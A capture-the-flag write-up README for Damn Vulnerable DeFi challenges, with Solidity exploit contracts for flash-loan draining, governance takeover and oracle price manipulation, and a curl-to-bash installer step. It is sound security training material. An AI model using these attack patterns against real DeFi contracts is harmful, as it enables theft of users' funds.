# Damn-Vulnerable-DeFi-Foundry
```text
               ___                   _   __     __                  __   __       ___      _____ 
              / _ \___ ___ _  ___   | | / /_ __/ /__  ___ _______ _/ /  / /__    / _ \___ / __(_)
             / // / _ `/  ' \/ _ \  | |/ / // / / _ \/ -_) __/ _ `/ _ \/ / -_)  / // / -_) _// / 
            /____/\_,_/_/_/_/_//_/  |___/\_,_/_/_//_/\__/_/  \_,_/_.__/_/\__/  /____/\__/_/ /_/  
```

## Table of Contents
~ [Requirements](#requirements)

~ [About](#about)

~ [Unstoppable](#1-unstoppable)

~ [Naive Receiver](#2-naive-receiver)

~ [Truster](#3-truster)

~ [Side Entrance](#4-side-entrance)

~ [The Rewarder](#5-the-rewarder)

~ [Selfie](#6-selfie)

~ [Compromised](#7-compromised)

## <a name="requirements"></a>Requirements
To work with this repository, you need to fulfill the following requirements:

1. Install Foundry: 
```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
```
2. Clone the Damn Vulnerable DeFi Foundry repository to your local machine using Git:
```bash
git clone https://github.com/10ap17/Damn-Vulnerable-DeFi-Foundry.git
cd Damn-Vulnerable-DeFi-Foundry
```
3. Ensure that you have all the required dependencies installed to run the tests. You can install dependencies by running:
```bash
forge install
```
4. To test any challenge, you can use the following command, replacing NameOfTestFile.t.sol with the name of the specific test file:
```bash
forge test --match-test test/NameOfTestFile.t.sol
```
Ensure that you meet these requirements before proceeding with any operations or testing within the Damn Vulnerable DeFi Foundry repository.

## <a name="about"></a>About
Damn Vulnerable DeFi is the CTF for offensive security of DeFi smart contracts in Ethereum blockchain. It encompasses various challenges ranging from flash loans and price oracles to governance exploits, NFT vulnerabilities, lending pool attacks and more.
In this repository, you'll find a collection of challenges that simulate real-world vulnerabilities found in decentralized finance (DeFi) applications. Each challenge presents a unique scenario where participants are tasked with exploiting vulnerabilities to achieve specific objectives.
To solve these challenges, we employ the Foundry framework, a powerful toolset that provides the flexibility to craft and execute sophisticated attacks against vulnerable smart contracts. Foundry allows participants to explore different attack vectors and manipulate contract states.
## <a name="1-unstoppable"></a>1. Unstoppable
This is an example of Denial of Service where the line `convertToShares(totalSupply) != balanceBefore` is vulnerable. So, by sending any amount of tokens, that is greater than 0, we could cause Denial of Service
## <a name="2-naive-receiver"></a>2. Naive receiver
In the `function flashLoan()`, the pool initiates a flash loan by transferring ETH to the receiver and allowing it to execute arbitrary logic. However, the `function onFlashLoan()` in the receiver contract doesn't properly validate the caller's identity, allowing anyone to invoke it. By exploiting this vulnerability, an attacker can repeatedly trigger the `function flashLoan()`, draining the receiver's ETH balance by forcing it to pay the fixed fee with each loan. This attack effectively takes all ETH held by the receiver contract, exploiting the lack of proper authorization checks in the `function onFlashLoan()`.
### Solution
```solidity
function attack(IERC3156FlashBorrower receiver, NaiveReceiverLenderPool pool) external {
    for (uint256 i = 0; i < 10; i++) {
        pool.flashLoan(receiver, ETH, 0, "");
    }
}
```
## <a name="3-truster"></a>3. Truster
In this vulnerable flash loan function, the vulnerability lies in the external code execution through the `target.functionCall(data)` line. While flash loans are designed to provide temporary liquidity, allowing borrowers to execute arbitrary code poses a significant security risk. By accepting a target address and call data as parameters, the function enables the execution of any function on the target contract. This opens the door to potential exploits.
```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)external nonReentrant returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }
```
### Solution
To exploit this vulnerability, we will utilize the `attack` function, which interacts with the `TrusterLenderPool` and `DamnValuableToken` contracts. In this function, we initiate a flash loan by calling `pool.flashLoan(0, address(this), address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), 1000000))`. Here, we request a loan of 0 tokens, specifying our contract as the borrower and the DamnValuableToken contract as the target. The `abi.encodeWithSignature` function prepares the call data with the signature of the `approve` function, allowing us to approve our contract to spend 1000000 tokens from the pool.

Subsequently, we execute `token.transferFrom(address(pool), address(this), 1000000)` to transfer the approved tokens from the pool to our contract. This sequence of actions enables us to exploit the vulnerability.
```solidity
function attack(TrusterLenderPool pool, DamnValuableToken token)external{
        pool.flashLoan(0,address(this), address(token),abi.encodeWithSignature("approve(address,uint256)",address(this),1000000));

        token.transferFrom(address(pool),address(this),1000000);
        }
```
## <a name="4-side-entrance"></a>4. Side Entrance
The `function flashLoan()` lacks proper verification during loan execution, allowing attackers to exploit a discrepancy between the token balance and the internal accounting system. By depositing borrowed funds back into the contract during the callback phase, attackers can manipulate the accounting system, deceiving the verification process and enabling unauthorized fund withdrawals.
```solidity
function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore)
            revert RepayFailed();
    }
```
### Solution
This contract exploits a vulnerability in the `SideEntranceLenderPool` contract by executing a flash loan attack. In the `function attack()`, it initiates a flash loan from the pool with an initial balance of 1000 ether, then immediately withdraws the funds. Additionally, the `function execute()` allows the attacker to deposit any received funds back into the pool, further manipulating its balance. Finally, the contract includes a `function receive()` to accept incoming Ether payments.
```solidity
function attack()external{
        pool.flashLoan(INITIAL_BALANCE_POOL);
        pool.withdraw();
    }

function execute()external payable{
        pool.deposit{value: msg.value}();
    }
```
## <a name="5-the-rewarder"></a>5. The Rewarder
The vulnerability lies in the mechanism of distributing rewards in `TheRewarderPool` contract. Specifically, the distribution of rewards depends on a single snapshot in time rather than continuous or aggregated data points. This makes the system susceptible to manipulation through flash loans.
```solidity
 function distributeRewards() public returns (uint256 rewards) {
        if (isNewRewardsRound()) {
            _recordSnapshot();
        }

        uint256 totalDeposits = accountingToken.totalSupplyAt(lastSnapshotIdForRewards);
        uint256 amountDeposited = accountingToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);

        if (amountDeposited > 0 && totalDeposits > 0) {
            rewards = amountDeposited.mulDiv(REWARDS, totalDeposits);
            if (rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                rewardToken.mint(msg.sender, rewards);
                lastRewardTimestamps[msg.sender] = uint64(block.timestamp);
            }
        }
    }
```
### Solution
We utilize the `skip function` in Foundry to bypass the 5-day cooldown period, allowing us to do the attack process.
To exploit this vulnerability, we aim to claim the most rewards in the upcoming round by manipulating the snapshot mechanism. By taking a significant flash loan and approving and than depositing liquidity, we can create a snapshot of the current balances state. After that, we can withdraw the deposited tokens and transfer them to `TheFlashLoanerPool` to complete the flash loan.
```solidity
 function attack()external{
        flashPool.flashLoan(liquidityToken.balanceOf(address(flashPool)));
    }

    function receiveFlashLoan(uint256 amount)external{
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.distributeRewards();
        rewarderPool.withdraw(amount);

        liquidityToken.transfer(address(flashPool), amount);
    }
```
## <a name="6-selfie"></a>6. Selfie
The vulnerability lies in the `SimpleGovernance` contract's mechanism for queuing actions based on the number of votes rather than any additional security checks. This means that any user with sufficient voting power can queue an action within the `SimpleGovernance` contract, regardless of their intentions or the potential impact on the system. Specifically, critical functions like function `emergencyExit()` can be called, leaving the contract vulnerable to fund drains.
```solidity
 function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit FundsDrained(receiver, amount);
    }
```
### Solution
To exploit this vulnerability, we utilize the flash loan feature provided by the `SelfiePool` contract to borrow a significant amount of governance tokens (`function attack1()`). These tokens grant us the necessary voting power to queue an action within the `SimpleGovernance` contract. Once the action is queued, it remains in a pending state for 2 days (`function attack2()`), after that time it can be executed. This allows us to do harmful actions within the governance system, such as draining funds.
```solidity
 function attack1()external{

        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), INITIAL_SUPPLY_POOL, abi.encodeWithSignature("emergencyExit(address)", address(this)));
    
    }

    function attack2()external{

        governance.executeAction(actionID);
    
    }

    function onFlashLoan(address _address,address _token, uint256 _value, uint256 zero, bytes memory data)external returns(bytes32){
        
        token.snapshot();
        token.approve(address(pool), _value);

        actionID= governance.queueAction(address(pool), uint128(zero), data);

        return CALLBACK_SUCCESS;
    }
```
## <a name="7-compromised"></a>7. Compromised
The vulnerability exploited in this attack lies in the `TrustfulOracle` contract's reliance on a fixed set of trusted reporters to determine the price of the DVNFT tokens. By compromising trusted reporters, the attacker can manipulate the reported price, leading to erroneous valuations within the `Exchange` contract.
```solidity
 function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) {
        _setPrice(msg.sender, symbol, newPrice);
    }
```
### Solution
To execute the attack, the attacker first manipulates the `TrustfulOracle` by feeding it false price information using the compromised reporters. This lowers the price of DVNFT tokens on the `Exchange` contract, allowing the attacker to purchase them at a significantly reduced rate(`function attack1()`). Once the tokens are acquired, the attacker quickly reverts the price manipulation, restoring the DVNFT token price to its original value. The attacker then sells the purchased tokens back to the `Exchange` contract at the higher price(`function attack2()`), effectively profiting from the price discrepancy.

```solidity
 function attack1()external{
        id = exchange.buyOne{value: address(this).balance}();
        token.approve(address(exchange), id);
    }

    function attack2()external{
        exchange.sellOne(id);
    }
```
In the `TestAttack` contract, the manipulation of the DVNFT token price is demonstrated using Foundry. Initially, the attacker pranks the `TrustfulOracle` by posting false price information, setting the DVNFT token price to 0. After that, the attacker executes the first stage of the attack by purchasing DVNFT tokens from the `Exchange` contract at the artificially lowered price. We reverse the price manipulation, restoring the DVNFT token price to its original value. After that, the attacker completes the attack by selling the acquired tokens back to the `Exchange` contract at the higher price.
```solidity
 function testAttack()external{
        for(uint256 i; i<3; i++){
            vm.prank(sources[i]);
            oracle.postPrice("DVNFT", 0);
        }
        assertEq(oracle.getMedianPrice("DVNFT"), 0);

        attacker.attack1();

        for(uint256 i; i<3; i++){
            vm.prank(sources[i]);
            oracle.postPrice("DVNFT", INITIAL_EXCHANGE_ETH_BALANCE);
        }
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_EXCHANGE_ETH_BALANCE);

        attacker.attack2();

        assertEq(address(exchange).balance, 0);
        assertEq(exchange.token().balanceOf(address(attacker)), 0);
        assertEq(address(attacker).balance, INITIAL_EXCHANGE_ETH_BALANCE + INITIAL_PLAYER_ETH_BALANCE);
    }
```